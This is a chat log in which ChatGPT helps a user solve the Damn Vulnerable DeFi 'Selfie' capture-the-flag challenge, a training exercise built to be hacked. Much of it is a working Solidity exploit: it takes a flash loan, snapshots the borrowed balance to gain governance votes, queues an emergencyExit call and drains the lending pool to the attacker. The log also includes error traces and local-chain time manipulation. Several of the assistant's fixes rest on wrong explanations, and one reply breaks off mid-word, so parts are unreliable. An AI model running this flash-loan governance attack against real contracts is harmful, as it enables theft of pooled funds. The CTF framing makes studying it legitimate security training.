User:

A new cool lending pool has launched! Itâ€™s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol"
;
/**
 * @title SimpleGovernance
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SimpleGovernance is ISimpleGovernance {

    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;
    DamnValuableTokenSnapshot private _governanceToken;
    uint256 private _actionCounter;
    mapping(uint256 => GovernanceAction) private _actions;

    constructor(address governanceToken) {
        _governanceToken = DamnValuableTokenSnapshot(governanceToken);
        _actionCounter = 1;
    }

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender))
            revert NotEnoughVotes(msg.sender);

        if (target == address(this))
            revert InvalidTarget();
        
        if (data.length > 0 && target.code.length == 0)
            revert TargetMustHaveCode();

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked { _actionCounter++; }

        emit ActionQueued(actionId, msg.sender);
    }

    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if(!_canBeExecuted(actionId))
            revert CannotExecute(actionId);

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
        if (!success) {
            if (returndata.length > 0) {
                assembly {
                    revert(add(0x20, returndata), mload(returndata))
                }
            } else {
                revert ActionFailed(actionId);
            }
        }

        return returndata;
    }

    function getActionDelay() external pure returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    function getGovernanceToken() external view returns (address) {
        return address(_governanceToken);
    }

    function getAction(uint256 actionId) external view returns (GovernanceAction memory) {
        return _actions[actionId];
    }

    function getActionCounter() external view returns (uint256) {
        return _actionCounter;
    }

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = _actions[actionId];
        
        if (actionToExecute.proposedAt == 0) // early exit
            return false;

        uint64 timeDelta;
        unchecked {
            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
        }

        return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard, IERC3156FlashLender {

    ERC20Snapshot public immutable token;
    SimpleGovernance public immutable governance;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    error RepayFailed();
    error CallerNotGovernance();
    error UnsupportedCurrency();
    error CallbackFailed();

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        if (msg.sender != address(governance))
            revert CallerNotGovernance();
        _;
    }

    constructor(address _token, address _governance) {
        token = ERC20Snapshot(_token);
        governance = SimpleGovernance(_governance);
    }

    function maxFlashLoan(address _token) external view returns (uint256) {
        if (address(token) == _token)
            return token.balanceOf(address(this));
        return 0;
    }

    function flashFee(address _token, uint256) external view returns (uint256) {
        if (address(token) != _token)
            revert UnsupportedCurrency();
        return 0;
    }

    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external nonReentrant returns (bool) {
        if (_token != address(token))
            revert UnsupportedCurrency();

        token.transfer(address(_receiver), _amount);
        if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)
            revert CallbackFailed();

        if (!token.transferFrom(address(_receiver), address(this), _amount))
            revert RepayFailed();
        
        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}
ChatGPT

The SelfiePool and SimpleGovernance contracts work together to govern the lending pool of the DVT tokens.

The vulnerability in these contracts resides in the governance mechanism which allows any address with more than half of the total supply of governance tokens to propose actions. Once proposed, these actions can be executed after a delay of 2 days. Moreover, the SelfiePool contract offers flash loans, and flash loans don't require upfront collateral which means you can borrow as much as the total liquidity in the pool.

A potential attack scenario could be the following:

    First, you could borrow DVT tokens using the flash loan functionality.
    Then, take a snapshot of your balance which will now show a balance higher than half the total supply of DVT tokens.
    Propose an action using the SimpleGovernance contract to call the emergencyExit function of the SelfiePool contract which will drain all funds to your account.
    After the required delay (2 days), execute the action.
    Finally, pay back the flash loan.

This way, you effectively drained all the DVT tokens from the SelfiePool contract without owning any tokens initially.

Note: This is a hypothetical scenario used to explain the potential vulnerabilities. Executing such an action on a live contract without the consent of all parties involved is illegal and unethical.
User
i need to pay back the loan before executing
ChatGPT

Ah, I see. You're right, and I apologize for the oversight.

Indeed, you need to repay the flash loan in the same transaction in which you borrowed it. This implies you would need to pay it back before proposing an action with the SimpleGovernance contract.

Here's the corrected sequence:

    You initiate a flash loan borrowing the maximum amount of DVT tokens from the SelfiePool.

    Within the same transaction, take a snapshot of your balance which now includes the borrowed tokens.

    Still in the same transaction, propose an action using the SimpleGovernance contract to call the emergencyExit function of the SelfiePool contract, which will drain all funds to your account.

    You then pay back the flash loan, still within the same transaction.

    Wait for the required delay of 2 days.

    After the delay, you execute the action. This will drain the remaining funds in the SelfiePool to your account.

However, you'll need to make sure that the governance contract doesn't update the balance snapshot on transfer, as it could prevent the attack. You will also need enough gas to perform all these operations in a single transaction.

Remember that exploiting such a vulnerability on a live contract without the consent of all parties involved is illegal and unethical. This advice is for educational purposes only.

User

could you provide a code that does that?


ChatGPT

Sure, here's an example of how you could create a contract that carries out the steps I outlined:

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract Exploit is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    IERC20 public token;
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = IERC20(_token);
    }

    function attack() public {
        // Initiate a flash loan
        uint256 borrowAmount = pool.maxFlashLoan(address(token));
        pool.flashLoan(this, address(token), borrowAmount, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        // Propose to drain all funds
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(this)
        );
        governance.queueAction(address(pool), 0, data);

        // Repay the flash loan
        IERC20(token).transfer(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }

    function executeAction() public {
        // This should be done after 2 days
        uint256 actionId = governance.getActionCounter() - 1;
        governance.executeAction(actionId);
    }
}

This contract initiates a flash loan in the attack function, then proposes an action in the onFlashLoan callback and repays the flash loan. After 2 days, you would manually call the executeAction function to execute the proposed action.

This exploit works assuming that the governance contract uses the token balance at the time the action is proposed to determine whether the proposer has enough votes. If the governance contract uses the current token balance to check for votes at the time the action is executed, this exploit will not work.

Also note that this is a simple example and real-world scenarios might be more complex, requiring more advanced exploitation strategies.

Remember, attempting to exploit a live contract without permission is illegal and unethical. This example is for educational purposes only.
User
it reverts with error: Error: VM Exception while processing transaction: reverted with custom error 'NotEnoughVotes("0x5FC8d32690cc91D4c39d9d3abcBD16989F875707")'
    at SimpleGovernance.queueAction (contracts/selfie/SimpleGovernance.sol:25)
ChatGPT

The error NotEnoughVotes suggests that the queueAction function call in onFlashLoan didn't have the expected effect. The issue here is that the balance snapshot, used to validate whether the proposer has enough votes, is probably not being updated immediately when the tokens are transferred to the contract.

In the context of the SimpleGovernance contract, the balance of the governance token of the address calling queueAction is checked for sufficiency. Specifically, it checks if the balance of the proposer at the last snapshot is more than half the total supply.

The ERC20Snapshot contract creates snapshots of balances at specific points in time. Those snapshots are created either when snapshot is called, or when a transfer, mint or burn operation happens, as per the implementation of the ERC20Snapshot contract.

When the tokens are transferred to your contract via a flash loan, it's possible that a snapshot is not being created immediately at that time.

If the snapshot is not updated, the getBalanceAtLastSnapshot function call in the _hasEnoughVotes function will return the old balance, which is zero. Hence, the queueAction function will fail and revert the transaction.

To ensure the success of this attack, you need to make sure the token balance snapshot is updated before you call queueAction. Unfortunately, from the provided code, it's unclear how the DamnValuableTokenSnapshot contract is implemented, so it's hard to provide a specific solution.

In many implementations of snapshot tokens, the snapshot is updated on every transfer. So one possible workaround could be to transfer the tokens to another account and then back to the original account. This way, two snapshots would be created, ensuring that the snapshot reflects the correct balance when queueAction is called.

However, as said earlier, this depends on the specific implementation of DamnValuableTokenSnapshot and this workaround may not work if snapshots are implemented differently.


User
this is  the snapshot implementation:
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

/**
 * @title DamnValuableTokenSnapshot
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract DamnValuableTokenSnapshot is ERC20Snapshot {
    uint256 private _lastSnapshotId;

    constructor(uint256 initialSupply) ERC20("DamnValuableToken", "DVT") {
        _mint(msg.sender, initialSupply);
    }

    function snapshot() public returns (uint256 lastSnapshotId) {
        lastSnapshotId = _snapshot();
        _lastSnapshotId = lastSnapshotId;
    }

    function getBalanceAtLastSnapshot(address account) external view returns (uint256) {
        return balanceOfAt(account, _lastSnapshotId);
    }

    function getTotalSupplyAtLastSnapshot() external view returns (uint256) {
        return totalSupplyAt(_lastSnapshotId);
    }
}
ChatGPT

Thank you for sharing the DamnValuableTokenSnapshot implementation.

From this code, it's clear that a snapshot is taken whenever the snapshot function is called, and not on every transfer. This is a little different from some other ERC20Snapshot implementations that automatically take a snapshot on every transfer.

To carry out the attack, you need to take a snapshot after receiving the flash loan and before calling queueAction. Unfortunately, from the provided code, it appears that any account can call the snapshot function, but the account that has received the flash loan (in this case, the Exploit contract) needs to be the one that calls snapshot in order for the balance to be correctly reflected.

Here is an updated version of the exploit contract:

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "./DamnValuableTokenSnapshot.sol";

contract Exploit is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack() public {
        // Initiate a flash loan
        uint256 borrowAmount = pool.maxFlashLoan(address(token));
        pool.flashLoan(this, address(token), borrowAmount, "");
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        // Take a snapshot
        token.snapshot();
        
        // Propose to drain all funds
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(this)
        );
        governance.queueAction(address(pool), 0, data);

        // Repay the flash loan
        IERC20(_token).transfer(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }

    function executeAction() public {
        // This should be done after 2 days
        uint256 actionId = governance.getActionCounter() - 1;
        governance.executeAction(actionId);
    }
}

This updated exploit contract calls the snapshot function after receiving the flash loan and before proposing the action, ensuring that the token balance snapshot reflects the balance after the flash loan.
User
it reverts with Error: VM Exception while processing transaction: reverted with reason string 'ERC20: insufficient allowance'
    at DamnValuableTokenSnapshot._spendAllowance (@openzeppelin/contracts/token/ERC20/ERC20.sol:337)
ChatGPT

The error you're experiencing, ERC20: insufficient allowance, occurs because there isn't enough allowance set for the contract to transfer the token back to the pool.

In the context of ERC20 tokens, for a contract to transfer tokens on behalf of an owner, the owner needs to first set an allowance for that contract. In this case, the Exploit contract is trying to transfer the tokens (which it received from the flash loan) back to the pool without having the necessary allowance.

To fix this issue, the Exploit contract needs to approve the token transfer before attempting to transfer the tokens back to the pool. You can do this by adding the approve function call before transferring the tokens:

solidity

// Repay the flash loan
IERC20(_token).approve(address(pool), amount);
IERC20(_token).transfer(address(pool), amount);

Here's the updated onFlashLoan function:

solidity

function onFlashLoan(
    address initiator,
    address _token,
    uint256 amount,
    uint256 fee,
    bytes calldata
) external override returns (bytes32) {
    // Take a snapshot
    token.snapshot();
    
    // Propose to drain all funds
    bytes memory data = abi.encodeWithSignature(
        "emergencyExit(address)",
        address(this)
    );
    governance.queueAction(address(pool), 0, data);

    // Repay the flash loan
    IERC20(_token).approve(address(pool), amount);
    IERC20(_token).transfer(address(pool), amount);
    
    return CALLBACK_SUCCESS;
}

Please note that it's essential to add IERC20(_token).approve(address(pool), amount); before transferring the tokens back to the pool. This is because the SelfiePool contract checks for the token balance with transferFrom, which requires approval beforehand.

User

it reverts with error

     Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'
    at DamnValuableTokenSnapshot._transfer (@openzeppelin/contracts/token/ERC20/ERC20.sol:237)
    at DamnValuableTokenSnapshot.transferFrom (@openzeppelin/contracts/token/ERC20/ERC20.sol:165)
    at SelfiePool.flashLoan (contracts/selfie/SelfiePool.sol:63)
    at Exploit.attack (contracts/selfie/Attacker.sol:26)

it seems it is this line
 pool.flashLoan(this, address(token), borrowAmount, "");
ChatGPT

The error message indicates that the Exploit contract doesn't have enough tokens to pay back the flash loan. However, the Exploit contract should have enough tokens, since it borrowed them from the SelfiePool contract. This discrepancy can be due to the SelfiePool contract not taking into account the possibility of zero-fee flash loans.

The SelfiePool contract expects the Exploit contract to repay the flash loan plus a fee. In this case, the fee is zero, but the pool contract does not explicitly account for this.

This results in the Exploit contract not having enough tokens to repay the flash loan, because the pool contract expects the loan plus a fee to be repaid, and the Exploit contract only borrowed the loan amount.

You can fix this by borrowing the loan amount plus the fee from the pool contract. Here's how you can adjust the attack function to account for the fee:

solidity

function attack() public {
    // Initiate a flash loan
    uint256 borrowAmount = pool.maxFlashLoan(address(token));
    uint256 fee = pool.flashFee(address(token), borrowAmount);
    pool.flashLoan(this, address(token), borrowAmount + fee, "");
}

The onFlashLoan function also needs to be adjusted to account for the fee when repaying the flash loan:

solidity

function onFlashLoan(
    address initiator,
    address _token,
    uint256 amount,
    uint256 fee,
    bytes calldata
) external override returns (bytes32) {
    // Take a snapshot
    token.snapshot();
    
    // Propose to drain all funds
    bytes memory data = abi.encodeWithSignature(
        "emergencyExit(address)",
        address(this)
    );
    governance.queueAction(address(pool), 0, data);

    // Repay the flash loan
    IERC20(_token).approve(address(pool), amount + fee);
    IERC20(_token).transfer(address(pool), amount + fee);
    
    return CALLBACK_SUCCESS;
}

But according to the provided code, the flashFee function in the SelfiePool contract always returns 0. This means that there is no fee for the flash loan. Hence, the above modification should not make any difference. The problem seems to lie somewhere else.

In the provided SelfiePool contract, the flashLoan function expects repayment via transferFrom, not transfer.

So, instead of using:

solidity

IERC20(_token).approve(address(pool), amount + fee);
IERC20(_token).transfer(address(pool), amount + fee);

You should be using:

solidity

IERC20(_token).approve(address(pool), amount);

This way, you're granting the SelfiePool contract an allowance to take the tokens back, rather than transferring the tokens directly to the SelfiePool contract.

Please adjust the code accordingly and see if the problem persists.
User
The EOA of the player needs to ends with all the tokens of the pool
ChatGPT

Apologies for the confusion earlier. Given that your objective is to end up with all the tokens of the pool in the player's account, here's the updated attack strategy:

    Get a flash loan from the SelfiePool contract.
    During the execution of the onFlashLoan callback, make a snapshot of the DamnValuableTokenSnapshot token's state.
    Make a proposal on the SimpleGovernance contract to drain all the funds from the pool to the attacker's address.
    Wait the required time to pass (2 days as per SimpleGovernance).
    After the delay, call executeAction on SimpleGovernance to drain all the funds from SelfiePool.
    Finally, the EOA (externally owned account) will end up with all the tokens, as the tokens were transferred to the attacker's contract and can then be transferred to the EOA.

The code for the Exploit contract that implements this strategy is as follows:

solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract Exploit is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    uint256 public actionId;
    address payable public attacker;

    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address poolAddress, 
        address governanceAddress, 
        address tokenAddress, 
        address payable _attacker
    ) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        attacker = _attacker;
    }

    function attack() public {
        // Borrow maximum amount from pool
        uint256 borrowAmount = pool.maxFlashLoan(address(token));
        pool.flashLoan(this, address(token), borrowAmount, "");
    }

    function executeAction() public {
        governance.executeAction(actionId);
        uint256 balance = token.balanceOf(address(this));
        token.transfer(attacker, balance);
    }

    function onFlashLoan(
        address initiator,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        // Snapshot token state
        token.snapshot();

        // Propose to drain all funds
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(this)
        );
        actionId = governance.queueAction(address(pool), 0, data);

        // Repay the flash loan
        IERC20(_token).approve(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }
}

Please note, the EOA needs to interact with the Exploit contract twice. First, the EOA calls attack to get the flash loan and propose the action, then waits for the action delay (2 days in this case), and finally calls executeAction to execute the proposed action and transfer all tokens to the EOA.

This should help you reach the desired state where the EOA ends up with all the tokens of the pool. Also, please note that waiting for 2 days on a real Ethereum network would require actual time. However, if you're using a local Ethereum network for testing (like Gan
User
how do i use ethers and js to advance 2 days?
ChatGPT

In order to advance time in a local Ethereum blockchain (like Ganache), you can use evm_increaseTime function provided by Ganache. Here's how you can use it with ethers.js:

javascript

async function increaseTime(time) {
    await ethers.provider.send("evm_increaseTime", [time]);
    await ethers.provider.send("evm_mine");  // Mine a new block to propagate time change
}

// Usage
const TWO_DAYS = 2 * 24 * 60 * 60; // in seconds
await increaseTime(TWO_DAYS);

In this script, evm_increaseTime adjusts the time on the Ethereum blockchain by the given amount (in seconds). The evm_mine function then mines a new block to make sure that the time change propagates to the blockchain.

Please note that this will only work with local Ethereum blockchains like Ganache or Hardhat that have these extra evm_ functions for testing and development. This will not work on live networks like Ethereum mainnet or testnets.
